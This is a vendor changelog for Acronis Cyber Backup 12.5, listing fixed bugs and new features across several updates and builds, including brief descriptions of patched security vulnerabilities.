* [ABR-299449] Acronis system report executed from Linux-based bootable media environment may fail when saved to external USB drive or SMB share in some cases.
* [ABR-294663] Agent for Linux: "BackupAndRecoveryAgent" crash: "mms killed by SIGILL" in rare cases.
* [ABR-293548] Disks management UI in bootable media environment may appear as garbled when there are multiple uninitialized disks present in the system.
* [ABR-293400] "Cannot find archive" error appears when trying to validate/recover backup created via acrocmd if ".tib" string was included in backup name ("--arc" parameter).
* [ABR-284559] Number of devices shown in files/folders backup plan details (Plans view) is incorrect when the plan contains different source paths.
* [ABR-278118] Disk-level recovery of a system MBR disk cannot be configured in the bootable media UI with "There is insufficient free space on the target disk" error when the target disk is significantly bigger than 2TB.
* [ABR-276011] Wi-Fi adapter installed in a Microsoft Surface device is not detected in bootable media environment due to missing mrvl/pcie8897\_uapsta.bin firmware.
* [ABR-257484] Linux-based bootable media or Agent for VMware (Virtual Appliance) may crash when accessing SMB network shares in rare cases.
* [ABR-253564] Linux-based bootable media does not detect disks on storage controller with 8086:2822 8086:2822 PCI ID (megasr).
* [ABR-251280] "Failed to copy disks" error appears in bootable media or web console UI while configuring disk/volume-level recovery, when trying to manually map GPT disk/volume from backup to unallocated disk/volume of the same size in rare cases.
* [ABR-245880] Acronis MMS service crashes on Linux and/or Mac devices which have 4k sector sized disks in some cases.
* [ABR-225417] Bootable media: In "Where to recover" > "Recover to:" section, there is "New virtual machine" selected by default instead of physical machine.

#### Security

* [SEC-2302] Acronis "file\_protector" driver control device internal API is accessible for services running under unprivileged user.
* [SEC-2257] Local privilege escalation was possible via DLL Search-Order Hijacking with Acronis systeminfo.exe utility. We want to thank HackerOne researcher @mmg for reporting this to us.
* [SEC-2255] Local privilege escalation was possible via DLL hijacking when running Acronis Cyber Backup 12.5 installer from untrusted directory. We want to thank HackerOne researcher @dhiraj-mishra for reporting this to us.

#### Tape management

* [ABR-269207] Backup validation fails with "Tape media 'Tape 001' is required to complete the operation" error instead of prompting for the required cassette.

#### Roles and units management

* [PLTFRM-24998] "Administrators" group under Settings > Administrators is unexpectedly re-created after restart of Acronis Service Manager when this group was deleted before.

### Issues fixed in build 16363 (October 1, 2020)

#### Common

* [ABR-283776] Downloading logs from Overview > Activities produces empty .zip archives for some types of activities.

#### Security

* [ABR-253647] Agent for Linux: security vulnerability issue in the /usr/lib/Acronis/BackupAndRecovery/Common/check-pswd script.
* [SEC-2181] Local privilege escalation was possible due to a DLL injection vulnerability. The issue was assigned CVE-2020-10138, CVSS score 8.1 (high). We want to thank HackerOne researchers @adr, @mmg, @vanitas, @xnand for reporting this to us.

### Issues fixed in build 16343 (September 7, 2020)

#### Installation and upgrade

* [ABR-287680] In some cases, the installation of Agent build 16342 fails with the error "Failed to connect to machine. HTTP status code: 500" when you try to connect to the Acronis Management Server.

### Issues fixed in build 16342 (August 28, 2020)

#### Common

* [ABR-202103] A security vulnerability that allows attackers to send HTTP requests in the local network via Acronis Management Server. This vulnerability has been discovered by Julien Ahrens from RCE Security.

### Issues fixed in build 16327 (July 3, 2020)

#### Common

* [PLTFRM-22216] Outdated SHA and CBC cipher suites. TLS1.0/TLS1.1 is still enabled.
* [PLTFRM-22311] Usernames and passwords can be compromised when debug logging is enabled.
* [ABR-277278] Dynamic volumes are listed at the bottom when selecting volumes in "Specify disks and volumes" dialog of backup wizard.

### Issues fixed in build 16318 (June 12, 2020)

#### Installation and upgrade

* [ABR-251685] Agent for Linux: installation on CentOS 7.7 and 8.0 fails when performed with --force-weak-snapapi switch.
* [ABR-258502] Acronis Storage Node: Update from 12.5 Update 4 fails when Acronis Storage Node is installed on domain controller. Error: "Creating new user accounts is forbidden in the domain controller."

#### Common

* [ABR-238031] Backup console does not list disks/volumes for machines with huge amount of disks/volumes in "What to backup" section when creating a backup plan.

#### Active Protection

* [AAP-3880] Active Protection erroneously detects ams.exe, service\_process.exe and mms.exe as suspicious processes in some cases.

### Issues fixed in build 16180 (May 22, 2020)

#### Installation and upgrade

* [ABR-260896] There is no choice to "Create .msi and .mst files for unattended installation" if Acronis Cyber Backup is already installed on the system where the installer is executed.
* [ABR-258502] Upgrade from 12.5 Update 2 may fail with the error "There is no password for AMS service user account.", while a password for the AMS service user account, does, in fact, exist.
* [ABR-236373] Upgrade from old builds (v12.0) may fail with the error "There is no password for AMS service user account."
* [ABR-231185] After update from 12.5 Update 3 or older builds the backup agent on the same machine as Acronis Management Server may be shown as offline since the year 1754.
* [ABR-227879] Acronis Service Manager service fails to start after installation of Acronis Management Server on Windows Server 2012/2016 Core, in some cases.
* [ABR-223141] Previously deleted backup locations may reappear in the web console (Backups√¢¬Ü¬íLocations) after the update to Acronis Cyber Backup 12.5 Update 4.
* [PLTFRM-19649] Acronis License Server is constantly restarting when Acronis Cyber Backup 12.5 is installed on SLES 11 SP4.

#### Common

* [ABR-254904] Backup via acrocmd fails with error "Client session is not available" because acrocmd is started by the SYSTEM user.
* [AAP-3136] Active Protection plans cannot be applied to device managed by Agent for Windows installed inside a VMware ESXi virtual machine. The following error appears: "Group ID must be empty in request.".
* [AAP-2836] The "C:\Program Files\Acronis\MonitoringServer\headless\_shell.exe" process is erroneously detected as a suspicious process by Acronis Active Protection, when the Self-protection option is enabled.
* [ARC-53] Backups for files/folders fail with the error "The activity has failed due to a crash of Service Process" or similar error (crash of service\_process.exe), when there are cross-linked/duplicate folders selected as the source for backup. Example: "C:\Documents and Settings\" (English) and "C:\Dokumente und Einstellungen\" (German) are both selected as the source in the same backup plan.
* [KERNEL-7855] The snapman.sys driver may crash under specific conditions during the backup of disk/volume or Hyper-V VM, and cause the Windows blue screen of death.
* [KERNEL-7766] Backup of a Windows machine or Microsoft SQL DB may start failing with the error "A device attached to the system is not functioning," after running successfully for some time before.
* [KERNEL-7758] Backup of a Windows machine with enabled VSS may fail with the error "Device is not ready" after a reboot.
* [ABR-260590] If the values for domain name and DNS suffix do not match on the machine where Acronis Management Server is installed, the DNS suffix is shown instead of the domain name when adding organization administrators from Settings√¢¬Ü¬íAdministrators.
* [ABR-243095] NTFS volumes with cluster size 2MB are not recognized properly.
* [ABR-238478] The selection in section "Items to back up" of a disk/volume backup plan is reset if you add an additional machine while configuring the plan.
* [ABR-216936] Backup to specific NAS models fails with the error "Access to the file is denied," when using backup format v12.
* [ABR-217457] The mms.log is spammed with the error "The specified domain either does not exist or could not be contacted" every minute if the "Acronis Managed Machine Service" service is started under a local user, while the machine is in domain (may happen in update/upgrade scenarios).
* [ABR-213496] Installation of the snapapi module fails on Linux kernel 5.0
* [ABR-148549] Backup to a location managed by Acronis Storage Node fails with the unclear error "Backup failed, SocketError" if Acronis Storage Node is inaccessible from the backup agent side.

#### Application support

* [ABR-229797] Backup of a Microsoft Exchange cluster DAG database may fail with the error "The process cannot access the file because another process has locked a portion of the file."
* [ABR-218451] Microsoft SQL Server database instances cannot be backed up if TLS1.2 is enforced (SSL1.0/SSL3.0/TLS1.0/TLS1.1 disabled) on the application server.

#### Virtualization

* [ABR-231376] In some cases, recovery to a new virtual machine on VMware ESXi fails with the error message "Invalid configuration for device '0'."

#### Tape management

* [ABR-230384] The encrypted backup of a physical machine on tape cannot be opened for browsing of files/folders. Browsing fails with the error "Password is required," but the field where you can specify password will not be shown.

## What's new in Update 4

### Backup

* The enhanced backup option Performance and backup window (former Performance) enables you to set one of three levels of backup performance (high, low, prohibited) for every hour within a week. The high and low levels are configurable in terms of the process priority and output speed.
* The Physical Data Shipping backup option for cloud backups

### Recovery

The capability to save system information on a local disk or a network share if a recovery with reboot fails.

### Scalability

The maximum number of physical machines that can be registered on a management server increased from 4000 to 8000.

### Security

* The capability to disable anonymous registration so that a user name and password of a management server administrator are always required when registering a device.
* All communication during a device registration is done via HTTPS. It works out of the box and cannot be disabled. It is possible to enforce certificate verification during unattended installation in Windows and in Linux.
* Mass registration of devices by using a token instead of a user name and password
* The capability to install Agent for Linux in UEFI systems with enabled Secure Boot.

  During the installation, the Acronis key is generated, used to sign the snapapi module, and registered as a Machine Owner Key (MOK). Once the installation is completed, the user should restart the system and enroll the key by using the password provided by the setup program.

### Applications

* Support for Microsoft Exchange Server 2019
* CBT (tracking file changes at a block level) can be disabled for backups of SQL and Exchange databases.

### Active Protection

New protection options:

* Detection of cryptomining malware
* The capability to allow certain processes to modify backup files while self-protection is on
* Protection of network folders mapped as local drives

### Virtualization

* Conversion to the following virtual machine types:
  + VMware Workstation
  + VHDX virtual disks (for connection to a Hyper-V virtual machine)

  This conversion is supported in a backup plan or in a separate conversion plan created on the Plans tab.
* Support for Windows Server 2019 with Hyper-V and Microsoft Hyper-V Server 2019
* Support for Citrix XenServer 7.6
* The boot menu (in the text form) can be used when booting a Citrix XenServer virtual machine.

### Backup locations

The Acronis Storage product name changed to Acronis Cyber Infrastructure.

### Administering

* It is possible to add a comment to a device on the device Details pane. Devices can be searched and organized in dynamic groups by comments.
* In a domain environment, local accounts on the management server are not added by default to the Acronis Centralized Admins group and to the organization administrators list.
* The name of the Acronis Management Server service (ams) is changed to acrmngsrv, to avoid name conflicts with other software services.

### Support for new operating systems

* Support for RHEL 7.6, 8.0 (configurations with Stratis are not supported)
* Support for Ubuntu 18.10
* Support for Fedora 25, 26, 27, 28, 29
* Support for Debian 9.5, 9.6
* Support for Windows XP SP1 (x64) and SP2 (x64) is resumed
* Support for Windows XP SP2 (x86) is resumed with a special version of Agent for Windows

### Support for new languages

Support for seven more languages:

* Bulgarian
* Norwegian
* Swedish
* Finnish
* Serbian
* Malay
* Indonesian

## Issues fixed in Update 4 (build(s): 12730-14330)

This section describes issues that have been fixed in Update 4.

### Issues fixed in build 14330 (August 12, 2019)

#### Installation and upgrade

* [ABR-236809] The zmqgw.exe process crashes with the "Exception at Exchange::StartLoop: bad function call" error in some cases after an update from previous builds.
* [ABR-236744] The zmqgw.exe process crashes with the "Exception at Exchange::StartLoop Error 0xfa0018: Failed to convert unit at '.ID.Key'" error in some cases after an update from previous builds.
* [ABR-236641] Backup plans protecting Microsoft SQL Server or Microsoft Exchange Server may fail after an update from Acronis Backup 12.5 Update 4 builds. The error "An object with ID ' Root (Common::Guid) = 478D8766-3324-4B15-8378-5258E9D0FF3B [PrimaryKey (NIL)] [Type (Common::String) = InstanceManagement::Instance] ' cannot be found" is displayed.

### Issues fixed in build 14280 (August 7, 2019)

#### Installation and upgrade

* [ABR-231380] The abgw.pem certificate used for communication with Acronis Cyber Infrastructure is installed in the expired state.
* [ABR-227951] Upgrade from Acronis Backup 11.7 to 12.5 may fail while updating the management server database in some cases.
* [ABR-227141] After update from build #11010 to build #12890 managed vaults cannot be viewed on the "Backups" tab. The error "Failed to list vaults :: integer Overflow" appears.

#### Common

* [ABR-233121] Double quotes are displayed incorrectly in parameters of pre- and post- commands in Backup options.
* [ABR-232997 + ABR-120690] A reboot is required when recovering an EFI-based system to BIOS under WinPE media due to reset of GPT attributes to 0x0.
* [ABR-229985] The lists of devices and agents randomly jump when being scrolled in the backup console.
* [ABR-228049] Acronis Managed Machine Service (mms.exe) may crash when accessing a legacy (Version 11) format backup to which an incremental backup was appended as result of a mount operation.
* [ABR-225172] The "Apply Universal Restore" operation may crash when applied under bootable media to a Windows 10 x64 EFI system.
* [ABR-200589] A disk-level backup of a volume that contains a lot of mount points (>32k) fails. The error: "Internal error: record is greater then 32K" appears.

#### Roles and units management

* [PLTFRM-12637] Recovery is not possible if the backup was created by a user who is an administrator of both a parent and child unit, and the backup plan was applied on the parent unit level. The following error appears: "The agent is not suitable for this data type".
* [ABR-233386] The list of units is not sorted in the alphabetical order when accessed from the combobox in the upper-left corner of the backup console GUI (when switching between units).

### Issues fixed in build 13400 (May 9, 2019)

#### Installation and upgrade

* [ABR-225021] Installation of the backup agent with the "Global Proxy" settings does not properly store username and password for a proxy user in the agent configuration.
* [ABR-224984] The agent cannot connect to the management server (appears as "offline") when both are installed on the same machine and the "Global Proxy" settings are enabled during the installation.
* [ABR-223711] Trial cannot be started on a clean installation of Acronis Backup if the same Acronis account was used to an active trial on another machine before due to the improper trial license sync from the account.
* [ABR-222879] Creation of a backup plan fails with the "Failed to connect to 127.0.0.1 port 30667: Connection refused" error after the update if the management server was originally installed using an external SQL server database and IPv6 is set to preferred over IPv4 on the database server.

#### Common

* [ABR-225043] The backup plan applied to the default "All virtual machines" group requires the Advanced license while it should not.
* [ABR-225027] Creation of a backup plan with Acronis Cloud set as a backup destination fails with the "Empty reply from server" error if the "Global Proxy" settings are configured on the management server and/or backup agent sides.
* [ABR-224529] Acronis ZeroMQ Gateway Service (zmqgateway.exe process) consumes excessive memory when accessing a backup archive which contains more than 500 backups in it.
* [ABR-223688] The backup plan applied to the default "All" group of Office 365 mailboxes requires the Advanced license while it should not.
* [ABR-223623] Accessing the Acronis Cloud backup location fails if the "Global Proxy" settings are configured on the management server and/or backup agent sides.
* [ABR-223622] Creation of a backup plan may fail on the license check if the "Global Proxy" settings are configured on the management server and/or backup agent sides.
* [ABR-222999] Creation of a backup plan where "What to back up" includes several network shares hosted on the same server may fail with "Can't deduplicate SMB locations." error.

#### Active Protection

* [ABR-221734] The license check fails when trying to enable Active Protection for a VM with the installed Agent for Windows, if this VM is running on a Hyper-V host and the license is assigned to this host (not to the VM directly).

### Issues fixed in build 13160 (March 26, 2019)

#### Installation and upgrade

* [ABR-203595] Installation of Acronis Backup in Windows fails if performed by a user who is not an administrator on this machine. The following error appears: "Failed to open Service Control Manager on machine."
* [ABR-200792] Acronis Backup installer scans through the TapeLocation folder (which contains the tape contents cache) while updating an existing Acronis Backup installation and this takes a very long time.
* [ABR-199995] Random (dynamic) UDP ports are unexpectedly opened during installation of Acronis Backup Agent for Windows and during backup.
* [ABR-198862 + ABR-203923 + ABR-211120] An agent is not registered on the management server during a remote installation if this agent was registered on a different management server before. The following error appears: "Get tenant of agent in AMS failed."
* [ABR-197560] Remote agent update sometimes fails with the following error: "The service cannot be started, either because it is disabled or because it has no enabled devices associated with it".
* [ABR-166851] The Acronis Management Server service fails to start on the machine where "HPE Agentless Management Service" is running, due to service names conflict (both share the "AMS" name).
* [ABR-166332] Some Acronis Backup components (for example, Acronis Storage Node) may fail to register on the management server while being installed simultaneously. The following error appears: "Getting token failed."
* [ABR-130789] The Acronis Management Server service fails to start if the service user is changed from the default "./ams user" to "Network Service".
* [KERNEL-2315] A Microsoft Windows Hyper-V host may crash in rare cases due to installation of the Acronis file\_tracker.sys file system driver.

#### Common

* [ABR-215977] Custom NTFS permissions for the folders located in a volume root are not recovered if the backup format is Version 12.
* [ABR-214370] Some sensitive data may be captured in the backup traffic between Agent for VMware (Virtual Appliance) and a backup location managed by Acronis Storage Node.
* [ABR-211378] A file recovery may fail if the backup was created by an agent running in a different Windows version. The following error appears: "Access to the file is denied."
* [ABR-210974] Mounting a large backup may fail with the "Pathes to mounted folders not found" error.
* [ABR-210602] File/folder permissions in Linux may not be correctly recovered if the files are recovered to a non-original location.
* [ABR-210018] IOPS performance of NVMe and RAID disks is impacted after installation of Agent for Windows in Windows Server 2016 or later. This is caused by the Acronis SnapAPI driver (snapman.sys)
* [ABR-209323] Backup or backup replication to specific NAS models fails if the backup format is Version 12. The following error appears: "Cannot create a backup of the specified type in archive 'archive ID' because it contains backups of another type. A backup archive can contain backups of one type only."
* [ABR-209251] Logs of the TaskManager component are not retained properly and may consume gigabytes of space in large environments.
* [ABR-208326] Activities are not retained properly on the backup agent side if there are thousands of them (for example, when the agent performs many backups a day).
* [ABR-206879] A backup from WinPE-based media to a deduplicating location fails. The following error appears: "Feature 'Deduplication' is not available due to license restrictions."
* [ABR-206077] Unexpected "Deleting vault" activity appears and completes with an error when restarting the Acronis Storage Node service.
* [ABR-204739] Acronis Monitoring Service consumes an excessive amount of RAM and CPU when a large number of devices (more than 3000) are registered on the management server.
* [ABR-204638] Acronis Monitoring Service fails to start if the HTTP\_PROXY environment variable is set.
* [ABR-204470] The Acronis Management Server service crashes when editing a backup plan that includes more than 3500 Microsoft Exchange mailboxes.
* [ABR-204466] Disk/volume recovery fails if the ext4 file system in the backup contains a file that is larger than 12.5 percent of the entire file system size. The following error appears: "Inode Is Corrupted".
* [ABR-204341] The option "Continue booting the operating system in X seconds" does not work (the OS does not start upon the timeout) when booting a machine from Acronis PXE Server with uploaded Linux-based bootable media.
* [ABR-202159] A volume recovery fails if the backup contains a corrupted file system, even though volume resize is not required.
* [ABR-201622] The Managed locations column on the Settings > Storage nodes tab does not contain data (the number of locations).
* [ABR-200589] A backup of a Linux system with a lot of mount points (the sum of records for them exceeds 32 KB) fails. The following error appears: "Internal error: record is greater than 32K."
* [ABR-199955] Service\_process.exe may crash during a backup if the backup format is Version 12 and the backup chain includes a large number of backups.
* [ABR-199970] The GUI does not show up when booting specific hardware models from Acronis PXE Server.
* [ABR-197152 + ABR-211661] Files cannot be browsed and recovered from a disk-level backup of a ReFS-formatted volume in Windows Server 2019.
* [ABR-195120] It is not possible to delete more than 50 agents from the management server at once.
* [ABR-194696] An unclear error message appears in the log file if the backup was interrupted by a system reboot.
* [ABR-193293] The Acronis Management Server service occasionally crashes when deleting more than 500 machines at a time.
* [ABR-191388] A backup scheduled on the When a user logs on to the system and When a user logs off the system events does not run upon these events.
* [ABR-188862] A backup to the cloud storage may fail when applying retention rules. The following error appears: "0xfc0026: 16515110".
* [ABR-188360] The network settings specified while creating WinPE-based media are ignored and reset to DHCP when booting from this media.
* [ABR-188297] Mounting a backup located on a network share fails with the "The device is not ready" error.
* [ABR-176180] The backed-up files and folders are mixed when sorted by name in the backup console.
* [ABR-171148] The retention rule for Daily backups does not work if the retention rules are set for Monthly, Weekly, and Daily backup sets, but the slider in the backup schedule is set to Monthly or Weekly.
* [ABR-169543] The NTFS permissions are lost when files are recovered from a disk/volume backup to a network share.
* [ABR-169126] The output speed limitation defined in percent does not work correctly.
* [ABR-160290] The 'xfs\_repair' utility, available in bootable media, cannot repair modern XFS file systems (for example, created in CentOS 7.3 or higher versions).
* [ABR-151180] Backup events are duplicated in Windows Event Log when the corresponding option is enabled in a backup plan.
* [ABR-139276] Backups created under bootable media appear in the backup console with the "localhost" name instead of user-specified name.
* [ABR-136109] Acronis Secure Zone cannot be browsed by using Windows Explorer.
* [ABR-134942] The Export and Validate actions are not available for backups if only the Standard licenses are registered.
* [ABR-139892 + ABR-137884 + ABR-131473 + ABR-131479] Backup sizes shown on Dashboard and listed in Reports are incorrect.
* [ABR-130385] Recovery points of deleted managed locations are still visible during recovery.
* [ABR-121244] When a virtual machine backup fails and then completes successfully on subsequent run, the Activity failed alert is preserved and is not canceled automatically. This issue affects only backup plans that include more than one virtual machine.

#### Application support

* [ABR-211531] Application-aware backup of a machine with SQL Server completes with the "BACKUP LOG cannot be performed because there is no current database backup." warning if a read-only SQL database is present.
* [ABR-204575] The SQL database recovery wizard hangs on Loading... after changing the target machine in Recover to.
* [ABR-200080] A backup of Exchange mailboxes may fail on highly loaded systems, due to PowerShell unresponsiveness. The following error appears: "Failed to initialize PowerShell adapter."
* [ABR-199016] Browsing the backed-up Exchange data causes the "Error occurred while opening the file." error, if the Exchange database path in Exchange configuration starts with the drive letter in lower case, for example "e:\" instead of "E:\".
* [ABR-192313] The incorrect date of "November 29, 2076" is displayed when browsing Exchange calendar objects in an application-aware backup.
* [ABR-173532] A backup of Exchange mailboxes may fail if network connectivity between the Active Directory domain controller and Microsoft Exchange Server is unstable.
* [ABR-169246] A backup of a Microsoft SQL Server 2008 instance may complete with the "[Microsoft][ODBC SQL Server Driver][SQL Server]DDL statement is not allowed." warning.
* [ABR-168890] An application-aware backup of a virtual machine running in VMware vSphere 6.5 or later may not truncate transaction logs of Microsoft Exchange 2016.
* [ABR-160566] An incorrect warning appears about the inability to truncate log of the SQL Server master database, while log truncation for this database is not possible by Microsoft design: [https://docs.microsoft.com/en-us/previous-versions/sql/sql-server-2008-r2/ms365937(v=sql.105)](https://docs.microsoft.com/en-us/previous-versions/sql/sql-server-2008-r2/ms365937%28v%3Dsql.105%29)
* [ABR-145282] Options to recover data of applications, such as Microsoft Exchange or Microsoft SQL, are available while browsing recovery points via Agent for Linux (that does not support these operations). An attempt to select these options fails. The following error appears: "Factory for a command with ID = '8C769D85-F9AF-4BB8-AB9D-D0658C9DF7F7' cannot be found."

#### Mac support

* [ABR-207964] Logs from Mac's unified logging system are not captured by the Acronis system report utility.
* [ABR-207194] A backup to an SMB share fails with various errors if the specified credentials are incorrect but guest access to the share is allowed.
* [ABR-195195] Excessive logs are generated by the Acronis Scheduler Service if a backup plan uses The backup location's host is available condition and the host is not available.
* [ABR-124845] Although it is possible to set a backup schedule by events and conditions in a backup plan applied to machines running OS X, Agent for Mac does not perform backup according to such schedule.

#### Virtualization

* [ABR-212963] The logs of Agent for VMware (Virtual Appliance) may be flooded with "Assertion failed: !"Unknown scsi host type"" errors if a misconfigured device is attached to the appliance.
* [ABR-210035] Multiple VM replication tasks executed in parallel may fail if the replicas are located on the same ESXi host where Agent for VMware (Virtual Appliance) is running. The following error appears: "Waiting for response from the replica disk service has timed out."
* [ABR-209498] The incorrect warning "Error 0x530114: The SCSI ID of device 'sdd' is empty" may appear when backing up virtual machines with specific configuration by using Agent for VMware (Virtual Appliance) and the HotAdd backup mode.
* [ABR-207900] Virtual USB controllers are not preserved after a recovery to a new VM on VMware ESXi.
* [ABR-207904] The "svga.vramSize" parameter of the virtual machine is not preserved after a recovery to a new VM on VMware ESXi.
* [ABR-207227] Agent for Hyper-V sporadically goes offline in the backup console if installed on a Hyper-V host which is part of a huge cluster (with hundreds of virtual machines in it).
* [ABR-205738] File recovery from an agent-less backup of a Linux virtual machine with LVM may not work for specific LVM configurations.
* [ABR-204439] Agent-less backup of a VMware ESXi virtual machine with Oracle ASM volumes is slow due to the invalid CBT record.
* [ABR-204259] The Hosts and clusters group is empty if Hyper-V cluster nodes were added from a child unit context via remote installation of Agent for Hyper-V to all nodes of the Hyper-V cluster.
* [ABR-201294] The "Encryption as a machine property" feature cannot be used for backups created by Agent for VMware (Virtual Appliance) due to missing manage\_creds.py script on this agent.
* [ABR-200593] The memory consumption of the "mms" process on a Virtuozzo 6 host constantly grows after a backup is performed.
* [ABR-199944] A replication of a VMware ESXi virtual machine fails if there is a space symbol in the target datastore name. The following error appears: "Failed to upload file '404'".
* [ABR-173514] A backup of a Hyper-V virtual machine with shared VHDX disks may contain inconsistent data for these disks if the CBT option is enabled.
* [ABR-170916] vSphere 6.7 cannot be managed by Acronis Backup 12.5 if there is a PMEM datastore present in the vSphere infrastructure. Symptoms: Agent for VMware (Virtual Appliance) cannot be deployed from the management server with the "Failed to obtain information about hosts from VMware vCenter Server 'IP'" error on the vCenter connection stage.
* [ABR-168922] VM replication from ESXi 6.5/6.7 to ESXi 6.0 or lower version fails with "A specified parameter was not correct: configSpec.guestId" if the Guest OS version of the replicated VM is not supported by target ESXi host version (Examples: Oracle Linux, CentOS 7 (64-bit))
* [ABR-165033] When manually starting a backup for some of machines included in the backup plan (for example, for 5 machines out of 10 total), the backup may also start for other machines unexpectedly.
* [ABR-145237] The Acronis Backup Appliance allows including itself in a backup plan along with other virtual machines, which causes issues with VMware snapshots consolidation after a backup.
* [ABR-118214] Native replicas of Microsoft Hyper-V virtual machines cannot be distinguished from the source virtual machines due to matching WMI IDs.
* [ABR-113660] It is possible to select Agent for VMware (Virtual Appliance) for backup, while it should not be.

#### Tape management

* [ABR-215254] Exporting a backup from a tape device that is connected via iSCSI under Linux-based bootable media, fails. The following error is displayed: "An invalid URI".
* [ABR-208806 + ABR-198282] Recovery of files/folders from a disk-level backup of a Linux machine is not possible if the backup is located on a tape and includes the Linux swap partition.
* [ABR-208006] Orphaned tape locations cannot be removed from the backup console.
* [ABR-197139] The Eject tapes after each successful backup of each machine option value is not saved after editing a backup plan.
* [ABR-173238] Backups located on tapes managed by Acronis Storage Node may appear in different parts of the user interface even after the corresponding tapes were erased.
* [ABR-128092] The error message "Input/output error" is unclear in the following situation: a backup to tapes fails because there are no tapes in the Free tapes pool and the Backup options > Backup format option is set to Version 12.

## What's new in Update 3.2

### Backup

The capability to stop an execution of a backup plan from the Plans tab.

### Support for new operating systems

* Support for Windows Server 2019
* Support for CentOS 7.5
* Support for ClearOS 7.4
* Support for macOS Mojave 10.14

### Virtualization

* Support for Citrix XenServer 7.3, 7.4, 7.5
* Support for Nutanix AHV

## Issues fixed in Update 3.2

This section describes issues that have been fixed in Update 3.2.

### Issues fixed in build 11010 (October 15, 2018)

#### Installation and upgrade

* [ABR-172115] Installation fails to register Agent for Windows and Acronis Storage Node components on the management server during update from Acronis Backup 12.5 Update 2 or the previous versions in case the components list was modified before the update.

#### Common

* [ABR-168992] A false-positive √¢¬Ä¬úThe backup did not start as scheduled.√¢¬Ä¬ù alert is generated when the interval between scheduled backups is more than 50 days.
* [ABR-194989] The Acronis Management Service dependent zmqgw.exe process occasionally crashes when there is a large number of devices (2000+) registered on the management server.
* [ABR-190754] Custom machine groups may be partially missing while creating a backup plan and choosing the list of devices to be included into this plan.
* [ABR-189640] Activities on the management server remain running and cannot be stopped if the agent which produced these activities is out of sync with the management server, for example if the machine was restored from a backup.
* [ABR-189039] Acronis Backup 12.5 Advanced licenses for Chinese language are not enabling advanced features. Acronis Storage Node and tapes management becomes unavailable.
* [ABR-185216] VSS provider selection is unavailable in Backup Options->Volume Shadow Copy (VSS) settings.
* [ABR-177723] If a backup is exported/replicated to another location, then the retention rules applied to this exported/replicated backup do not perform data clean up properly, thus leaving orphaned backup chains. As the result the backups' size in original and secondary backup locations differs significantly even though both backups contain the same set of recovery points.
* [ABR-177645] Backup to an SMB share with the Version 12 backup format fails with "Input/Output" error ("code":"5005") if the SMB share returns "INVALID\_PARAMETER" on file sparse requests. Typically this problem affects SMB shares hosted on NAS devices.
* [ABR-176719] The Managed Machine service ("mms") crashes on Linux during backup to the cloud storage through a configured proxy connection if the proxy server becomes unavailable.
* [ABR-175989] Backup to an SMB share with the Version 12 backup format does not properly fail and hangs instead if there is no free space left on the share.
* [ABR-174598] Backup replication plans fail automatically if they last for more than 12 hours. This problem does not affect regular backup plans with backup replication option enabled.
* [ABR-141944] False alerts 'Machine is offline for more than XX days' are generated when starting the management server if the machine is online for more than XX days.

#### Active protection

* [ABR-188613] In some cases, the "Self-protection" feature (part of Acronis Active Protection) produces false positive alarms about the C:\Windows\System32\rundll32.exe binary.

#### Tape management

* [ABR-135829] The "arsm.exe" process consumes excessive amount of memory during files/folders backup with the enabled retention rules to a centralized tape location managed by Acronis Storage Node.

#### Application support

* [ABR-181405] In some cases service\_process.exe crashes when performing an application-aware backup of Windows Server 2003 machine running SQL 2005.

#### Mac support

* [ABR-180057] "Entire machine" backup of MacOS Sierra fails with "Failed to lock the volume." + "Operation not permitted" errors if there is a "Recovery HD" volume present.
* [ABR-175023] "Entire machine" backup does not resume and hangs after the machine wakes up from the sleep mode.
* [ABR-168967] In some cases, backup of APFS-fromatted volumes with the Version 12 backup format fails with an "input/output" error.

## What's new in Update 3.1

* The maximum number of physical machines that can be registered on a management server increased from 2000 to 4000.
* The number of virtual machines that Agent for VMware or Agent for Hyper-V backs up simultaneously can be limited via the registry or the agent configuration file. Unlike the similar setting in backup plan options, this parameter limits the total number of virtual machines for all backup plans that the agent runs simultaneously.

## Issues fixed in Update 3.1

This section describes issues that have been fixed in Update 3.1.

### Issues fixed in build 10330 (June 23, 2018)

#### Installation and upgrade

* [ABR-172452] Backup Monitor does not start automatically after an update from Acronis Cyber Backup 12.5 Update 2 due to a missing autostart record in the Windows registry.
* [ABR-160804] The License Server service starts consuming ~10% of CPU when there are ~4000 machines registered on the management server.

#### Common

* [ABR-173911] Backup plans with the Convert to a virtual machine option enabled may fail in some cases with the "The password for the protected backup is incorrect" error if the backup archive is protected with password.
* [ABR-173518] Backup to NFS shares fails if the name of the backed-up machine contains spaces. Applicable to agentless VM backup performed by Agent for VMware or Agent for Hyper-V.
* [ABR-171198] Collecting system information report from Acronis Management Server fails if the remote Microsoft SQL 2014 instance is used as a database for the management server.
* [ABR-170852] CentOS 7 does not boot when restored to a Citrix XenServer 7.0 environment.
* [ABR-170640] Empty .zip is downloaded when restoring a folder which contains " ' " (apostrophe) symbol in its name.
* [ABR-170140] Files/folders backup of OneDrive folder fails with "The file is read-only" error after Windows 10 update to 10.0.17134 build.

#### Application support

* [ABR-174095] Exchange or Office 365 mailbox backup may occasionally fail with the "Can't connect to the mailbox of user Mailbox database guid" error.

## What's new in Update 3

### New features available in all on-premise deployments

#### Backup

* The Multi-volume snapshot backup option is available when backing up Linux.
* The data output speed can be specified as a percentage, in addition to kilobytes per second.
* The "File-level security" backup option is discontinued. The NTFS permissions for files are always saved in file-level backups.
* Automatic troubleshooting of VSS-related issues:
  + When backing up disks or volumes with Agent for Windows

    After taking a VSS-based snapshot fails, before retrying, Acronis Cyber Backup analyzes the log and performs troubleshooting steps, if appropriate. If three consecutive retries fail, the error message recommends to download and use Acronis VSS Doctor.
  + When backing up Microsoft SQL Server databases

    Prior to taking a snapshot, Acronis Cyber Backup checks the SQL Server configuration for issues that may cause a VSS snapshot failure. If issues are found, a warning with recommendations is added to the log.

#### Recovery

The new recovery option Boot mode determines the boot mode (BIOS or UEFI) for the Windows system being recovered.

#### Security

New system settings are available to organization administrators:

* Log out users after a configurable period of inactivity
* Show notification about the last login of the current user
* Warn about local or domain password expiration

#### Applications

Starting with Microsoft Exchange 2010, Exchange Server data can be backed up and recovered by using a less-privileged account than a member of the Organization Management role group:

* For databases, membership in the Server Management role group is enough.
* For mailboxes, membership in the Recipient Management role group and the enabled ApplicationImpersonation role are enough.

#### Virtualization

* Support for VMware vSphere 6.7 (ESXi configuration backup is not supported)
* Recovery to the original virtual machine from a backup that contains not all disks of this machine.

